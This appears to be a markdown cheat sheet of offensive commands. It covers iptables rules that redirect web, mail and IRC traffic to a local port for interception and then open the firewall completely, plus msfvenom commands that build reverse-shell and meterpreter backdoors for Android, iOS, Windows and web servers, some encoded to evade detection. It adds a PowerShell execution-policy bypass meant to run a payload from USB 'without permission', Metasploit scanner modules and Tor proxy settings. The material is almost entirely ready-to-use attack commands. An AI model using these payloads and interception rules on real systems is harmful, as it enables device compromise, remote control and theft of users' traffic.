# <img width="55" src="http://0z3r00t3r.6te.net/img/ip.png"> IP Forward  
#### &#x1F538; to open ip forward in linux&#x1F427; terminal type :
      
      sudo echo 1 > /proc/sys/net/ipv4/ip_forward
      sysctl -w net.ipv4.ip_forward=1
      #See a list of network devices and their state: 
      -  nmcli dev
      #Add a rule to intercept [http,https,imaps,pop3s,irc]
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports <PORT/8080>

      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 80 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 443 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 993 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 995 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 6697 -j REDIRECT --to-port <PORT/8080>

      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 80 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 443 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 993 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 995 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 6697 -j REDIRECT --to-port <PORT/8080>

      sudo iptables -P INPUT ACCEPT
      sudo iptables -P OUTPUT ACCEPT
      sudo iptables -P FORWARD ACCEPT
      sudo iptables -F INPUT
      sudo iptables -F OUTPUT
      sudo iptables -F FORWARD
      sudo iptables-save
   
# <img width="55" src="http://0z3r00t3r.6te.net/img/msf.png"> MSF Venom Backdoor
#### &#x1F538; APK::Generation 

   `msfvenom --payload="android/shell/reverse_tcp" --arch="dalvik" --platform="android" --encode="cmd/powershell_base64" LHOST=ip LPORT=port -k -o 1x.apk`

   `msfvenom --payload="android/shell/reverse_tcp" --arch="dalvik" --platform="android" --encode="cmd/echo" LHOST=ip LPORT=port -k -o 2x.apk`

   <i>on android target</i> : ```run the 1x.apk / or 2x.apk```

#### &#x1F538; IPA(iphone)::Generation

   `msfvenom --payload="apple_ios/armle/meterpreter_reverse_tcp" --platform="apple_ios" --arch="armle" LHOST=ip LPORT=port -f macho -o 1x.ipa`

   `msfvenom --payload="apple_ios/aarch64/shell_reverse_tcp" --platform="apple_ios" --arch="aarch64" LHOST=ip LPORT=4444 -o shell`

   <i>on iphone ssh run</i> `./shell`


#### &#x1F538; PS1(windows)::Generation

   `msfvenom --payload="windows/meterpreter/reverse_http" --format="psh" --platform="windows" --arch="x86" --encoder="cmd/powershell_base64" --encrypt="base64" LHOST=ip LPORT=port -o x86.ps1`

   `msfvenom --payload="windows/meterpreter/reverse_tcp" --platform="windows" --arch="x86" --encoder="x86/shikata_ga_nai" -x cmd.exe -i 14 LHOST=ip LPORT=port -f exe -o bad_cmd.exe`

#### &#x1F538; Auto run without permisstion: use it with USB

   `c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit -File x86.ps1`

#### &#x1F538; MSFvenom Other : 
      msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
      msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORTn> -f raw > shell.sh
      msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
      
      #1: msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
      #2: cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php


# &#x1F538; MSF Aux / Set : 

      use auxiliary/scanner/http/http_version
      use auxiliary/scanner/http/options
      use auxiliary/scanner/http/ssl
      use auxiliary/scanner/http/webdav_scanner
      use auxiliary/scanner/http/host_header_injection
      use auxiliary/scanner/ssl/openssl_heartbleed
      use auxiliary/scanner/portscan/syn
      use auxiliary/scanner/smb/smb_version
      use auxiliary/scanner/mssql/mssql_ping
      #enum_wayback ALL LINKS 
      use auxiliary/scanner/http/enum_wayback   
      #dir_listing
      use auxiliary/scanner/http/dir_listing
      #dir_scanner
      use auxiliary/scanner/http/dir_scanner
      #dir_webdav_unicode_bypass
      use auxiliary/scanner/http/dir_webdav_unicode_bypass
      #files_dir
      use auxiliary/scanner/http/files_dir

#### &#x1F538; Set Options : 
      set Proxies socks5:127.0.0.1:9050
      set DisablePayloadHandler false
      set ExitOnSession false

